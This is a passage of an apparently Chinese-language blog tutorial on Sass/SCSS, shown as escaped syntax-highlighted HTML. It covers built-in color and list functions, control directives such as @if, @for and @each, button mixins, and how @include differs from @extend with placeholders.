class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">ie-hex-str(#abc) =&gt; #FFAABBCC</span><br><span class=\"line\">ie-hex-str(#3322BB) =&gt; #FF3322BB</span><br><span class=\"line\">ie-hex-str(rgba(0, 255, 0, 0.5)) =&gt; #8000FF00</span><br></pre></td></tr></table></figure>\n<h4 id=\"darken\"><a href=\"#darken\" class=\"headerlink\" title=\"darken\"></a>darken</h4><p>darken(color,color,amount)</p>\n<p>第一个参数是颜色，第二参数是百分数介于0%-100%，表示将某个颜色变暗多少个百分比。</p>\n<figure class=\"highlight\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">darken(hsl(25, 100%, 80%), 30%) =&gt; hsl(25, 100%, 50%)</span><br><span class=\"line\">darken(#800, 20%) =&gt; #200</span><br></pre></td></tr></table></figure>\n<h4 id=\"lighten\"><a href=\"#lighten\" class=\"headerlink\" title=\"lighten\"></a>lighten</h4><p>lighten(color,color,amount)</p>\n<p>第一个参数是颜色，第二参数是百分数介于0%-100%，表示将某个颜色变亮多少个百分比。</p>\n<figure class=\"highlight\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">lighten(hsl(0, 0%, 0%), 30%) =&gt; hsl(0, 0, 30)</span><br><span class=\"line\">lighten(#800, 20%) =&gt; #e00</span><br></pre></td></tr></table></figure>\n<h4 id=\"percentage\"><a href=\"#percentage\" class=\"headerlink\" title=\"percentage\"></a>percentage</h4><p>percentage($value)： 将一个没有单位的数字转成百分比形式</p>\n<figure class=\"highlight\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">percentage(0.2) =&gt; 20%</span><br><span class=\"line\">percentage(100px / 50px) =&gt; 200%</span><br></pre></td></tr></table></figure>\n<h4 id=\"length\"><a href=\"#length\" class=\"headerlink\" title=\"length\"></a>length</h4><p>length($list)</p>\n<p>返回一个列表的长度</p>\n<figure class=\"highlight\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">length(10px) =&gt; 1</span><br><span class=\"line\">length(#514721 #FFF6BF #FFD324) =&gt; 3</span><br></pre></td></tr></table></figure>\n<h4 id=\"nth\"><a href=\"#nth\" class=\"headerlink\" title=\"nth\"></a>nth</h4><p>nth(list,list,n);</p>\n<p>返回列表里面第n个位置的值</p>\n<figure class=\"highlight\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">nth(10px 20px 30px, 1) =&gt; 10px</span><br><span class=\"line\">nth((Helvetica, Arial, sans-serif), 3) =&gt; sans-serif</span><br></pre></td></tr></table></figure>\n<h4 id=\"unit\"><a href=\"#unit\" class=\"headerlink\" title=\"unit\"></a>unit</h4><p>unit($number)</p>\n<p>得到这个数的单位</p>\n<figure class=\"highlight\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">unit(100) =&gt; \"\"</span><br><span class=\"line\">unit(100px) =&gt; \"px\"</span><br><span class=\"line\">unit(3em) =&gt; \"em\"</span><br><span class=\"line\">unit(10px * 5em) =&gt; \"em*px\"</span><br><span class=\"line\">unit(10px * 5em / 30cm / 1rem) =&gt; \"em*px/cm*rem\"</span><br></pre></td></tr></table></figure>\n<h4 id=\"unitless\"><a href=\"#unitless\" class=\"headerlink\" title=\"unitless\"></a>unitless</h4><p>unitless($number)</p>\n<p>返回这个数是否没有单位</p>\n<figure class=\"highlight\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">unitless(100) =&gt; true</span><br><span class=\"line\">unitless(100px) =&gt; false</span><br></pre></td></tr></table></figure>\n<h4 id=\"三目判断\"><a href=\"#三目判断\" class=\"headerlink\" title=\"三目判断\"></a>三目判断</h4><p>if(condition,condition,if-true, $if-false)</p>\n<p>第一个表示条件，第二个表示条件为真的值，第三个表示为假的值</p>\n<figure class=\"highlight\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">if(true, 1px, 2px) =&gt; 1px</span><br><span class=\"line\">if(false, 1px, 2px) =&gt; 2px</span><br></pre></td></tr></table></figure>\n<p>注意函数是返回一个值，不能直接放到sass里面直接去运行的，会报错。</p>\n<p>你可以把这些用在判断或者属性值里面，那么就是一级棒。</p>\n<p>下面我们来搞点自己定义的函数吧，先来个简单的：</p>\n<figure class=\"highlight scss\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">// px转em</span></span><br><span class=\"line\">@function pxToEm(<span class=\"variable\">$px</span>, <span class=\"variable\">$base</span>: 16) &#123;</span><br><span class=\"line\">  @return (<span class=\"variable\">$px</span> / <span class=\"variable\">$base</span>) * 1em;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"><span class=\"comment\">// 调用下：</span></span><br><span class=\"line\"><span class=\"selector-tag\">p</span>&#123;</span><br><span class=\"line\">  <span class=\"attribute\">font-size</span>:pxToEm(<span class=\"number\">20</span>);</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"><span class=\"comment\">// 解析后的css：</span></span><br><span class=\"line\"><span class=\"selector-tag\">p</span> &#123;</span><br><span class=\"line\">  <span class=\"attribute\">font-size</span>: <span class=\"number\">1.25em</span>;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<h3 id=\"if和-else\"><a href=\"#if和-else\" class=\"headerlink\" title=\"@if和@else\"></a>@if和@else</h3><figure class=\"highlight scss\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"variable\">$filter</span>:false !default; <span class=\"comment\">//是否开启ie滤镜</span></span><br><span class=\"line\"><span class=\"comment\">//背景色半透明</span></span><br><span class=\"line\">@<span class=\"keyword\">mixin</span> bgcolor-alpha(<span class=\"variable\">$bgcolor</span>: rgba(<span class=\"number\">0</span>,<span class=\"number\">0</span>,<span class=\"number\">0</span>,.<span class=\"number\">5</span>))&#123;</span><br><span class=\"line\">  <span class=\"attribute\">color</span>:<span class=\"number\">#fff</span>;</span><br><span class=\"line\">  @<span class=\"keyword\">if</span> <span class=\"variable\">$filter</span>&#123;</span><br><span class=\"line\">  <span class=\"attribute\">filter</span>:progid:DXImageTransform.Microsoft.gradient(enabled=<span class=\"string\">'true'</span>,startColorstr=<span class=\"string\">'#&#123;ie-hex-str($bgcolor)&#125;'</span>, endColorstr=<span class=\"string\">'#&#123;ie-hex-str($bgcolor)&#125;'</span>);</span><br><span class=\"line\">  &#125;@<span class=\"keyword\">else</span>&#123;</span><br><span class=\"line\">    <span class=\"attribute\">background-color</span>: <span class=\"number\">#333</span>;</span><br><span class=\"line\">  &#125;</span><br><span class=\"line\">  <span class=\"attribute\">background-color</span>:<span class=\"variable\">$bgcolor</span>;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<p>这是半透明rgba背景的一段代码，高级浏览器用rgba，ie6-8如果开启滤镜用滤镜，不开启滤镜就用纯色，常用于图片下方浮现标题。</p>\n<p>当然也不可能总是判断一个变量的真假那么简单，没有或与非的情况吧。sass的@if用<code>not,or,and</code>分别表示非，或，与。</p>\n<figure class=\"highlight scss\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"variable\">$a</span>:   false !default;</span><br><span class=\"line\"><span class=\"variable\">$b</span>:   true !default;</span><br><span class=\"line\"></span><br><span class=\"line\">@<span class=\"keyword\">if</span> not(<span class=\"variable\">$a</span>)&#123;</span><br><span class=\"line\">  <span class=\"selector-tag\">p</span>&#123;</span><br><span class=\"line\">    <span class=\"attribute\">color</span>:red;</span><br><span class=\"line\">  &#125;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"selector-tag\">div</span>&#123;</span><br><span class=\"line\">  <span class=\"attribute\">font-size</span>:<span class=\"number\">14px</span>;</span><br><span class=\"line\">  @<span class=\"keyword\">if</span> <span class=\"variable\">$a</span> or <span class=\"variable\">$b</span>&#123;</span><br><span class=\"line\">    <span class=\"attribute\">width</span>:<span class=\"number\">300px</span>;</span><br><span class=\"line\">  &#125;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"selector-tag\">li</span>&#123;</span><br><span class=\"line\">  <span class=\"attribute\">line-height</span>:<span class=\"number\">24px</span>;   </span><br><span class=\"line\">  @<span class=\"keyword\">if</span> <span class=\"variable\">$a</span> and <span class=\"variable\">$b</span>&#123;</span><br><span class=\"line\">    <span class=\"attribute\">float</span>:left;</span><br><span class=\"line\">  &#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<p>想想还是漏了个，sass用<code>==,!=</code>分别表示等于与不等于。</p>\n<figure class=\"highlight scss\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"variable\">$radius</span>: <span class=\"number\">5px</span> !default;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"selector-class\">.box-border</span>&#123;</span><br><span class=\"line\">  <span class=\"attribute\">border</span>:<span class=\"number\">1px</span> solid <span class=\"number\">#ccc</span>;</span><br><span class=\"line\">  <span class=\"attribute\">padding</span>:<span class=\"number\">10px</span>;</span><br><span class=\"line\"></span><br><span class=\"line\">  @<span class=\"keyword\">if</span> <span class=\"variable\">$radius</span> != 0&#123;</span><br><span class=\"line\">    <span class=\"attribute\">border-radius</span>:<span class=\"variable\">$radius</span>; </span><br><span class=\"line\">  &#125;</span><br><span class=\"line\">&#125;  </span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"variable\">$sizeClass</span>: small !default;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"selector-class\">.size</span>&#123;</span><br><span class=\"line\">  @<span class=\"keyword\">if</span> <span class=\"variable\">$sizeClass</span> == <span class=\"string\">'small'</span>&#123;</span><br><span class=\"line\">    <span class=\"attribute\">padding</span>:<span class=\"number\">5px</span>;</span><br><span class=\"line\">  &#125;@<span class=\"keyword\">else</span>&#123;</span><br><span class=\"line\">    <span class=\"attribute\">padding</span>:<span class=\"number\">10px</span>;</span><br><span class=\"line\">  &#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<h3 id=\"for\"><a href=\"#for\" class=\"headerlink\" title=\"@for\"></a>@for</h3><p>for循环有两种形式，分别为：<code></code>@for $var from start through end<code>和</code>@for $var start from to  end` 。$i表示变量，start表示起始值，end表示结束值，这两个的区别是关键字through表示包括end这个数，而to则不包括end这个数。先来个简单的：</p>\n<figure class=\"highlight scss\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">@<span class=\"keyword\">for</span> <span class=\"variable\">$i</span> from 1 through 3 &#123;</span><br><span class=\"line\">  <span class=\"selector-class\">.item-</span>#&#123;<span class=\"variable\">$i</span>&#125; &#123; <span class=\"attribute\">width</span>: <span class=\"number\">2em</span> * <span class=\"variable\">$i</span>; &#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<h3 id=\"each\"><a href=\"#each\" class=\"headerlink\" title=\"@each\"></a>@each</h3><p>语法：@each $var in</p>\n<figure class=\"highlight scss\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">@<span class=\"keyword\">each</span> <span class=\"variable\">$animal</span> in puma, sea-slug, egret, salamander &#123;</span><br><span class=\"line\">  .#&#123;<span class=\"variable\">$animal</span>&#125;-<span class=\"attribute\">icon</span> &#123;</span><br><span class=\"line\">    <span class=\"attribute\">background-image</span>: url(<span class=\"string\">'/images/#&#123;$animal&#125;.png'</span>);</span><br><span class=\"line\">  &#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<figure class=\"highlight scss\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"variable\">$sprite</span>: puma sea-slug egret salamander !default;</span><br><span class=\"line\"></span><br><span class=\"line\">%sprite-animal&#123;</span><br><span class=\"line\">    <span class=\"attribute\">background</span>: url(<span class=\"string\">'/images/animal.png'</span>) no-repeat;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\">@<span class=\"keyword\">each</span> <span class=\"variable\">$animal</span> in <span class=\"variable\">$sprite</span> &#123;</span><br><span class=\"line\">    .#&#123;<span class=\"variable\">$animal</span>&#125;-<span class=\"attribute\">icon</span> &#123;</span><br><span class=\"line\">        @<span class=\"keyword\">extend</span> %sprite-animal;     </span><br><span class=\"line\">        <span class=\"attribute\">background-position</span>:<span class=\"number\">0</span> -(index(<span class=\"variable\">$sprite</span>,<span class=\"variable\">$animal</span>)*<span class=\"number\">30px</span>);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<p>使用scss设计按钮样式：</p>\n<figure class=\"highlight scss\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">//$btnColorClass: (primary #0078E7 #fff) (green $green #fff);</span></span><br><span class=\"line\"><span class=\"variable\">$btnColorClass</span>: (primary <span class=\"number\">#0078E7</span> <span class=\"number\">#fff</span>) (blue <span class=\"number\">#00A3CF</span> <span class=\"number\">#fff</span>) (orange <span class=\"number\">#F47837</span> <span class=\"number\">#fff</span>) !default;</span><br><span class=\"line\"></span><br><span class=\"line\">@<span class=\"keyword\">mixin</span> btn-color(<span class=\"variable\">$bgColor</span>:<span class=\"number\">#e6e6e6</span>, <span class=\"variable\">$textColor</span>:<span class=\"number\">#333</span>)&#123;</span><br><span class=\"line\">  <span class=\"attribute\">color</span>:<span class=\"variable\">$textColor</span>;</span><br><span class=\"line\">  <span class=\"attribute\">background-color</span>: <span class=\"variable\">$bgColor</span>;</span><br><span class=\"line\">  <span class=\"attribute\">border</span>:<span class=\"number\">1px</span> solid darken(<span class=\"variable\">$bgColor</span>, <span class=\"number\">5%</span>);</span><br><span class=\"line\">  <span class=\"attribute\">border-color</span>:lighten(<span class=\"variable\">$bgColor</span>, <span class=\"number\">2%</span>) darken(<span class=\"variable\">$bgColor</span>, <span class=\"number\">5%</span>) darken(<span class=\"variable\">$bgColor</span>, <span class=\"number\">5%</span>) lighten(<span class=\"variable\">$bgColor</span>, <span class=\"number\">2%</span>);</span><br><span class=\"line\"></span><br><span class=\"line\">  &amp;:hover&#123;</span><br><span class=\"line\">    <span class=\"attribute\">background-color</span>: darken(<span class=\"variable\">$bgColor</span>,<span class=\"number\">5%</span>);</span><br><span class=\"line\">    <span class=\"attribute\">color</span>:<span class=\"variable\">$textColor</span>;</span><br><span class=\"line\">  &#125;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">@<span class=\"keyword\">each</span> <span class=\"variable\">$colorClass</span> in <span class=\"variable\">$btnColorClass</span>&#123;</span><br><span class=\"line\">  <span class=\"variable\">$class</span>:      nth(<span class=\"variable\">$colorClass</span>,<span class=\"number\">1</span>);</span><br><span class=\"line\">  <span class=\"variable\">$bgColor</span>:    nth(<span class=\"variable\">$colorClass</span>,<span class=\"number\">2</span>);</span><br><span class=\"line\">  <span class=\"variable\">$textColor</span>:  nth(<span class=\"variable\">$colorClass</span>,<span class=\"number\">3</span>);</span><br><span class=\"line\">  <span class=\"selector-class\">.btn-</span>#&#123;<span class=\"variable\">$class</span>&#125;&#123;</span><br><span class=\"line\">    @<span class=\"keyword\">include</span> btn-color(<span class=\"variable\">$bgColor</span>,<span class=\"variable\">$textColor</span>);</span><br><span class=\"line\">  &#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<h2 id=\"include-vs-extend\"><a href=\"#include-vs-extend\" class=\"headerlink\" title=\"@include vs @extend\"></a>@include vs @extend</h2><p>避免代码重复生成，</p>\n<p>SASS中产生了Mixins，我们可以将相似的样式定义成一个函数模块，然后通过<code>@include</code>来调用。但很多时候，我们又不需要这么强大的功能。</p>\n<p>这个时候出现<code>@extend</code>来调用定义好相同样式的类，可没想到，这个功能是方便了，但无形中为使用者埋下了一个地雷。</p>\n<p>为了解除这个隐患，在SASS3.2中增加了一个<code>%placeholders</code>功能。让大家能很方便定义一些功能简单的相同样式模块。</p>\n<p>通过前面的介绍<code>@mixin</code>需要<code>@include</code>来调用，而<code>.class</code>和<code>%placeholders</code>需要<code>@extend</code>来调用，那么两者有何区别呢？</p>\n<ul>\n<li><code>@include</code>主要是用来调用<code>@mixin</code>定义的函数模块。在<code>@mixin</code>中可以定义一个相似功能样式，而且可以设置变量、定义参数和默认参数值；</li>\n<li><code>@extend</code>主要是用来调用<code>.class</code>或者<code>%placeholders</code>定义的属性模块；在<code>.class</code>或者<code>%placeholders</code>中可以定义一个相同样式，但这里面不能定义参数；</li>\n<li><code>@include</code>每次调用相同的<code>@mixin</code>时，编译出来的CSS相同样式不会进行合并；</li>\n<li><code>@extend</code>每次调用相同的 <code>.class</code>时，如果<code>.class</code>在样式出现多次，那么编译出来的CSS有可能不是需要的样式；</li>\n<li><code>@extend</code>每次调用相同的<code>%placeholders</code>时，编译出来的CSS相同样式会进行合并。</li>\n</ul>\n<p>下面我们通过一个清除浮动的案例，分别看看<code>@include</code>和<code>@extend</code>之间的区别：</p>\n<h3 id=\"include与-mixin使用例子\"><a href=\"#include与-mixin使用例子\" class=\"headerlink\" title=\"@include与@mixin使用例子\"></a><code>@include</code>与<code>@mixin</code>使用例子</h3><figure class=\"highlight scss\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">@<span class=\"keyword\">mixin</span> clearfix&#123;</span><br><span class=\"line\">    &amp; &#123;</span><br><span class=\"line\">      *zoom: <span class=\"number\">1</span>;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    &amp;:before,</span><br><span class=\"line\">    &amp;:after &#123;</span><br><span class=\"line\">      <span class=\"attribute\">display</span>: table;</span><br><span class=\"line\">      <span class=\"attribute\">content</span>: <span class=\"string\">\"\"</span>;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    &amp;:after &#123;</span><br><span class=\"line\">      <span class=\"attribute\">clear</span>: both;</span><br><span class=\"line\">      <span class=\"attribute\">overflow</span>: hidden;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"selector-tag\">ul</span>&#123;</span><br><span class=\"line\">  @<span class=\"keyword\">include</span> clearfix;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"><span class=\"selector-class\">.block</span> &#123;</span><br><span class=\"line\">  @<span class=\"keyword\">include</span> clearfix;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<p>编译后：</p>\n<figure class=\"highlight css\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"selector-tag\">ul</span> &#123;</span><br><span class=\"line\">  *zoom: 1;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"><span class=\"selector-tag\">ul</span><span class=\"selector-pseudo\">:before</span>, <span class=\"selector-tag\">ul</span><span class=\"selector-pseudo\">:after</span> &#123;</span><br><span class=\"line\">  <span class=\"attribute\">display</span>: table;</span><br><span class=\"line\">  <span class=\"attribute\">content</span>: <span class=\"string\">\"\"</span>;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"><span class=\"selector-tag\">ul</span><span class=\"selector-pseudo\">:after</span> &#123;</span><br><span class=\"line\">  <span class=\"attribute\">clear</span>: both;</span><br><span class=\"line\">  <span class=\"attribute\">overflow</span>: hidden;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"selector-class\">.block</span> &#123;</span><br><span class=\"line\">  *zoom: 1;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"><span class=\"selector-class\">.block</span><span class=\"selector-pseudo\">:before</span>, <span class=\"selector-class\">.block</span><span class=\"selector-pseudo\">:after</span> &#123;</span><br><span class=\"line\">  <span class=\"attribute\">display</span>: table;</span><br><span class=\"line\">  <span class=\"attribute\">content</span>: <span class=\"string\">\"\"</span>;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"><span class=\"selector-class\">.block</span><span class=\"selector-pseudo\">:after</span> &#123;</span><br><span class=\"line\">  <span class=\"attribute\">clear</span>: both;</span><br><span class=\"line\">  <span class=\"attribute\">overflow</span>: hidden;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<p>很明显，相同的样式不会进行合并。</p>\n<h3 id=\"include和-placeholders使用例子\"><a href=\"#include和-placeholders使用例子\" class=\"headerlink\" title=\"@include和%placeholders使用例子\"></a><code>@include</code>和<code>%placeholders</code>使用例子</h3><figure class=\"highlight scss\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">%clearfix&#123;</span><br><span class=\"line\">    &amp; &#123;</span><br><span class=\"line\">      *zoom: <span class=\"number\">1</span>;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    &amp;:before,</span><br><span class=\"line\">    &amp;:after &#123;</span><br><span class=\"line\">        <span class=\"attribute\">display</span>: table;</span><br><span class=\"line\">        <span class=\"attribute\">content</span>: <span class=\"string\">\"\"</span>;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    &amp;:after &#123;</span><br><span class=\"line\">        <span class=\"attribute\">clear</span>: both;</span><br><span class=\"line\">        <span class=\"attribute\">overflow</span>: hidden;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"selector-tag\">ul</span>&#123;</span><br><span class=\"line\">  @<span class=\"keyword\">extend</span> %clearfix;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"><span class=\"selector-class\">.block</span> &#123;</span><br><span class=\"line\">  @<span class=\"keyword\">extend</span> %clearfix;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<p>编译后：</p>\n<figure class=\"highlight css\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"selector-class\">.block</span>, <span class=\"selector-tag\">ul</span> &#123;</span><br><span class=\"line\">  *zoom: 1;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"><span class=\"selector-class\">.block</span><span class=\"selector-pseudo\">:before</span>, <span class=\"selector-tag\">ul</span><span class=\"selector-pseudo\">:before</span>, <span class=\"selector-class\">.block</span><span class=\"selector-pseudo\">:after</span>, <span class=\"selector-tag\">ul</span><span class=\"selector-pseudo\">:after</span> &#123;</span><br><span class=\"line\">  <span class=\"attribute\">display</span>: table;</span><br><span class=\"line\">  <span class=\"attribute\">content</span>: <span class=\"string\">\"\"</span>;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"><span class=\"selector-class\">.block</span><span class=\"selector-pseudo\">:after</span>, <span class=\"selector-tag\">ul</span><span class=\"selector-pseudo\">:after</span> &#123;</span><br><span class=\"line\">  <span class=\"attribute\">clear</span>: both;</span><br><span class=\"line\">  <span class=\"attribute\">overflow</span>: hidden;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<p>很明显相同样式代码已经进行合并。</p>\n<h3 id=\"Mixins与-placeholders的结合\"><a href=\"#Mixins与-placeholders的结合\" class=\"headerlink\" title=\"Mixins与%placeholders的结合\"></a>Mixins与%placeholders的结合</h3><p>Mixins如果使用不当，就会产生很多重复的代码，但仅用<code>@extend</code>很多时候又无法达到功能上的需求。</p>\n<p>那么有没有方法能把Mixins与<code>%placeholders</code>结合起来，取他们各自的优势呢？</p>\n<p>大家都知道,<code>%placeholders</code>就类似于CSS中的<code>.classes</code>或者<code>#ids</code>，只不过使用<code>%</code>代替了<code>.</code>和<code>#</code>。但<code>%placeholders</code>中的代码只有通过 <code>@extend</code>调用之后才会产生代码量，不然他是不会产生任何代码量。</p>\n<p>下面我们来看一个Mixins与<code>%placeholders</code>结合在一起制作的一个网格系统。</p>\n<figure class=\"highlight scss\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span 